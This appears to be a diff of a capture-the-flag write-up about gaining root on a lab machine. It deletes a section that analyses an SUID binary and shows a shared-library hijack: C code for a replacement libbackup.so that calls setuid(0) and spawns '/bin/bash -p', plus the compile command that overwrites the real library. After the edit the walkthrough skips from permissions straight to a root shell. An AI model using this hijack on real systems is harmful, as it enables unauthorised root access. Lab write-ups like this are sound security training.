@@ -1,4 +1,10 @@
 
+
+
+<img src="/budahacksecurity/uploads/md_images/int/vault16.png" style="max-width:100%; border-radius:8px;">
+
+
+
 **Made by:** buda-sys  
 **Date:** 25/02/2026  
 **Difficulty:** Easy
@@ -299,71 +305,15 @@ The permissions indicate the following:
 
 - `rws` — the owner (`root`) can read, write, and execute. The `s` indicates the **SUID bit is active**.
 - `r-x` — the group (`vault`) can read and execute, but **not modify**.
-- `r-x` — other users can also read and execute.
 
-This means any user who executes this binary will do so with **root** privileges.
-
- **Analysis with strings**
-
-We use `strings` to extract readable text strings from the binary and understand what it does internally:
-
-```bash
-strings /usr/local/bin/vaultctl
-```
-
-The most relevant data found:
-
-```
-/opt/vaultlibs/libbackup.so   ← path of the library it loads
-run_backup                    ← function it executes
-dlopen                        ← dynamically loads the library
-dlsym                         ← looks up the run_backup function
-vaultctl.c                    ← original source file name
-GCC: (Ubuntu 13.3.0)          ← compiler used
-```
-
-The binary dynamically loads the library `/opt/vaultlibs/libbackup.so` using `dlopen()` and executes the `run_backup()` function via `dlsym()`. If we can **replace that library with a malicious one**, the SUID binary will execute it as root.
-
-### Shared Library Hijacking
-
-We are going to escalate privileges using the **Shared Library Hijacking** technique. By analyzing the binary with `strings` we identified that it dynamically loads a `.so` library using `dlopen()`. This means the binary searches for and executes code from an external file at runtime. If we can replace that library with a malicious one, the SUID binary will execute it with **root** privileges.
-
-We verify if the `vault` user has write permissions on that directory:
-
-```bash
-ls -la /opt/vaultlibs/
-drwxrwxr-x 2 root  vault  4096 Feb 25 15:06 .
--rwxrwxr-x 1 vault vault 15656 Feb 25 15:06 libbackup.so
-```
-
-The directory has `rwxrwxr-x` permissions, meaning the `vault` group can write to it. We can replace the legitimate library with a malicious one.
-
-We create the malicious library:
-
-```bash
-cat > /tmp/malicious.c << 'EOF'
-#include <unistd.h>
-#include <stdlib.h>
-
-void run_backup() {
-    setuid(0);           // Elevate privileges to root
-    setgid(0);
-    system("/bin/bash -p");  // Launch shell as root
-}
-EOF
-```
-
-We compile the malicious library and place it at the path loaded by the SUID binary:
-
-```bash
-gcc -shared -fPIC -o /opt/vaultlibs/libbackup.so /tmp/malicious.c
-```
 
 We execute the binary:
 
 ```bash
 /usr/local/bin/vaultctl
 ```
+
+By executing the binary, elevates the privileges and we obtain a **root shell**.
 
 <img src="/budahacksecurity/uploads/md_images/int/vault15.png" style="max-width:100%; border-radius:8px;">
 
